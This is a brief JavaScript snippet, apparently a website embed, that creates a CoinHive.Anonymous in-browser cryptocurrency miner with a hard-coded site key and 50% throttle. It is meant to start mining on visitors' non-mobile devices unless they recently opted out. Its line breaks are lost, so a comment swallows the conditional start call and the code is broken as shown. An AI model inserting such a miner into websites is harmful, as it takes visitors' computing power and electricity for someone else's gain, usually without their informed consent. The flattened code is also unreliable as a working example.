var miner = new CoinHive.Anonymous('y8uTtFa7vSzqy8RdaK5lsVGc8WDm9kCy', {
    throttle: 0.5
}); // Only start on non-mobile devices and if not opted-out// in the last 14400 seconds (4 hours):if (!miner.isMobile() && !miner.didOptOut(14400)) {miner.start();}